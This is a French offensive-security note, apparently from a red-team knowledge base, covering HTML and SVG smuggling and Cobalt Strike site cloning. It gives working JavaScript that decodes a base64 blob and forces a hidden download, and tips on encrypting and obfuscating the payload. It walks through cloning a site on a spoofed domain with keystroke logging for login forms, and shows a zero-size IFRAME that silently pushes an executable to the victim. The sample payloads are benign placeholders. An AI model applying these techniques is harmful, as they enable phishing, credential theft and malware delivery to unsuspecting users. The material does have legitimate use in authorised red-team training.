
- [[#HTML Smuggling]]
- [[#SVG Smuggling]]
- [[#Clonage de site]]

# HTML Smuggling

Consiste à encoder le fichier malveillant dans le code html et utiliser javascript pour le décoder et le télécharger. On peut également utiliser  la [Web Crypto API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API) pour chiffrer le payload en AES et obfuscer le javascript avec https://javascriptobfuscator.com/Javascript-Obfuscator.aspx par exemple.

Exemple avec fichier texte encodé en base64.

```html
<html>
    <head>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/brands.min.css">
    </head>
    <body>
        <button class="btn" onclick="downloadFile()"><i class="fa fa-download"></i> Download</button>

        <script>
            function convertFromBase64(base64) {
                let binary_string = window.atob(base64);
                let len = binary_string.length;
                let bytes = new Uint8Array(len);
                for (let i = 0; i < len; i++) {
                    bytes[i] = binary_string.charCodeAt(i);
                }
                return bytes.buffer;
            }

            function downloadFile() {
                const file = 'VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
                const fileName = 'test.txt';
                let data = convertFromBase64(file);
                let blob = new Blob([data], {type: 'octet/stream'});
                if (window.navigator.msSaveOrOpenBlob) {
                    window.navigator.msSaveBlob(blob,fileName);
                }
                else {
                    const a = document.createElement('a');
                    document.body.appendChild(a);
                    a.style = 'display: none';
                    const url = window.URL.createObjectURL(blob);
                    a.href = url;
                    a.download = fileName;
                    a.click();
                    window.URL.revokeObjectURL(url);
                }
            }
        </script>
    </body>
</html>
```

---
# SVG Smuggling

Identique au HTML Smuggling mais utilise le format SVG à la place.

```svg
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
<circle cx="50" cy="50" r="40" stroke="black" stroke-width="4" fill="none" />
<script>
    alert('Hello World');
</script>
Sorry, your browser does not support inline SVG.
</svg> 
```


---
# Clonage de site

[[#Cobalt Strike]]

## Cobalt Strike

### 1. Host File

Créer un Host File -> Site Management -> Host File

![[Pasted image 20250911200442.png]]

- File -> Package qui nous donnera notre accès initial.
- Local URI -> URI depuis laquelle notre package sera telechargeable.
- Local Host -> URL du domaine usurpé
- Local Port -> Port depuis lequel le site sera accessible
- Mime Type -> Definit le content type du fichier qui sera téléchargé, laisser en automatic.

Une fois lancé, le site apparait dans **Site Management > Manage**.

![[Pasted image 20250911200758.png]]


### 2. Clone Site

Créer un clone du site -> **Management > Clone Site**.

![[Pasted image 20250911200921.png]]

- Clone URL -> Page que nous voulons cloner
- Local URI -> Dossier dans lequel sont clonés les fichiers
- Local Host -> URL du domaine usurpé
- Local Port -> Port depuis lequel le site sera accessible
- Attack -> Récupérer le host file créé précédemment
- Log Keystrokes -> Keylogger afin de capturer les frappes au clavier de l'utilisateur sur le site, utile pour les login forms.

Une fois le clone effectué, une URL est générée et prête à être envoyée à la victime.

La victime verra le fichier être téléchargé lors de la visite de l'URL grâce à une IFRAME placée dans le code source

```js
<IFRAME SRC="http://www.bleepincomputer.com:80/dl/windows/utilities/system-information/g/gpu-z/GPU-Z.2.22.0.exe?id=null" WIDTH="0" HEIGHT="0"></IFRAME>
```